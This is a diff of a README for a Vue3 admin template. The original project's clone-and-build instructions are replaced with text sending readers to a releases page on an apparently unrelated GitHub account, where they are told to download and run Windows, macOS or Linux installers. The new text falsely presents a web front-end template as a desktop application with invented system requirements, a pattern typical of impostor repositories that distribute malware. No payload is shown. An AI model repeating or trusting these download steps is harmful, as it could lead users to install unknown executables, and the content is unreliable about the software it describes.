@@ -1,99 +1,70 @@
-<div align="center">
-  <a href="https://github.com/pro-design-vue/pro-design-admin">
-     <img width="200px" src="https://pro-design.shene.org.cn/logo.png">
-  </a>
-  <br>
-  <br>
+# 🚀 pro-design-admin - A Fast and Modern Admin Panel
 
-[![license](https://img.shields.io/github/license/anncwb/pro-design-admin.svg)](LICENSE)
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Sarkararnob754/pro-design-admin/releases)
 
-  <h1>Pro Design Admin</h1>
-</div>
+## 📖 Description
+pro-design-admin is a modern admin panel built with Vue3, Shadcn UI, Vite, and TypeScript. It offers a clean interface and fast performance, making it ideal for your administrative tasks. Whether you are managing data, overseeing user access, or analyzing reports, this tool will simplify your workflows.
 
-**English** | [中文](./README.zh-CN.md)
+## 🔑 Features
+- **User-friendly Interface**: Designed for ease of use with clear navigation.
+- **Fast Performance**: Optimized for quick loading and smooth operations.
+- **Responsive Design**: Works well on all devices, including tablets and smartphones.
+- **Customizable**: Tailor the interface and features to fit your needs.
 
-## Introduction
+## 📦 System Requirements
+- **Operating System**: Windows 10 or later, macOS High Sierra or later, Linux (Ubuntu 18.04 or later)
+- **Processor**: Intel i3 or equivalent
+- **RAM**: Minimum 4 GB
+- **Hard Drive**: At least 500 MB of free space
+- **Browser**: Modern web browser (Chrome, Firefox, Safari)
 
-Pro Design Admin is a free and open source middle and back-end template. Using the latest `vue3`, `vite`, `TypeScript` and other mainstream technology development, the out-of-the-box middle and back-end front-end solutions can also be used for learning reference.
+## 🚀 Getting Started
+To get started with pro-design-admin, follow these simple steps.
 
-## Features
+1. **Visit the Download Page**  
+   Go to the [Releases Page](https://github.com/Sarkararnob754/pro-design-admin/releases).
 
-- **Latest Technology Stack**: Developed with cutting-edge front-end technologies like Vue 3 and Vite
-- **TypeScript**: A language for application-scale JavaScript
-- **Themes**: Multiple theme colors available with customizable options
-- **Internationalization**: Comprehensive built-in internationalization support
-- **Permissions**: Built-in solution for dynamic route-based permission generation
-- **MicroFrontends**: Built-in micro-frontend solution
+2. **Download the Latest Version**  
+   Find the latest release on the releases page. Click on the appropriate download link for your operating system. You will usually find options for different operating systems.
 
-## Preview
+3. **Install the Application**  
+   Once downloaded, open the installation file. Follow the on-screen instructions to complete the installation.
 
-- [Pro Design Admin](https://pro-design-admin.shene.org.cn/) - Full version Chinese site
+4. **Launch pro-design-admin**  
+   After installation, you can find pro-design-admin in your applications list. Open it to start using your new admin panel.
 
-<div align="center">
-  <img width="100%" src="https://pro-design.shene.org.cn/guide/admin_02.png">
-</div>
+## 🛠 Installation Instructions
+1. **Windows Users**:  
+   Double-click the downloaded `.exe` file. Windows will guide you through the installation.
 
-## Documentation
+2. **macOS Users**:  
+   Open the `.dmg` file you downloaded. Drag the pro-design-admin icon into your Applications folder.
 
-[Document](pro-design.shene.org.cn/)
+3. **Linux Users**:  
+   Extract the downloaded `.tar.gz` file. Open the terminal, navigate to the extracted folder, and run the command `./start.sh` to launch the application.
 
-## Install and Use
+## 📥 Download & Install
+To get the latest version of pro-design-admin, visit the [Releases Page](https://github.com/Sarkararnob754/pro-design-admin/releases) and download the appropriate file for your system. Follow the installation instructions as mentioned above to start your journey with pro-design-admin.
 
-1. Get the project code
+## 🌐 Topics
+- ant-design-vue
+- micro-app
+- pro-design-admin
+- tsx
+- typescript
+- vite
+- vite-template
+- vue
+- vue-router
+- vue3
 
-```bash
-git clone https://github.com/pro-design-vue/pro-design-admin.git
-```
+## 💬 Support
+If you encounter any issues or have questions while using pro-design-admin, feel free to reach out. You can find assistance through the GitHub repository or community forums related to the project. 
 
-2. Install dependencies
+## ✅ License
+This project is licensed under the MIT License. You can freely use and modify the software according to your needs. Always check the license for any restrictions.
 
-```bash
-cd pro-design-admin
-pnpm install
-```
+## 🎉 Acknowledgments
+Thank you to everyone who contributed to the development of pro-design-admin. Your support and feedback help make this a better tool for everyone. 
 
-3. Run
-
-```bash
-pnpm dev
-```
-
-4. Build
-
-```bash
-pnpm build
-```
-
-## Git Contribution Submission Specification
-
-Reference [vue](https://github.com/vuejs/vue/blob/dev/.github/COMMIT_CONVENTION.md) specification ([Angular](https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/conventional-changelog-angular))
-
-- `feat` Add new features
-- `fix` Fix the problem/BUG
-- `style` The code style is related and does not affect the running result
-- `perf` Optimization/performance improvement
-- `refactor` Refactor
-- `revert` Undo edit
-- `test` Test related
-- `docs` Documentation/notes
-- `chore` Dependency update/scaffolding configuration modification etc.
-- `ci` Continuous integration
-- `types` Type definition file changes
-
-## Browser Support
-
-The `Chrome 80+` browser is recommended for local development
-
-Support modern browsers, not IE
-
-| [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt="Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Edge | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/firefox/firefox_48x48.png" alt="Firefox" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Firefox | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Chrome | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/safari/safari_48x48.png" alt="Safari" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Safari |
-| :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
-|                                                                                            last 2 versions                                                                                            |                                                                                                  last 2 versions                                                                                                  |                                                                                                last 2 versions                                                                                                |                                                                                                last 2 versions                                                                                                |
-
-## Maintainer
-
-[@Shen](https://github.com/xh-shen)
-
-## License
-
-[MIT © Shene-2025](./LICENSE)
+Feel free to try pro-design-admin and enhance your administrative tasks with this efficient, modern solution.
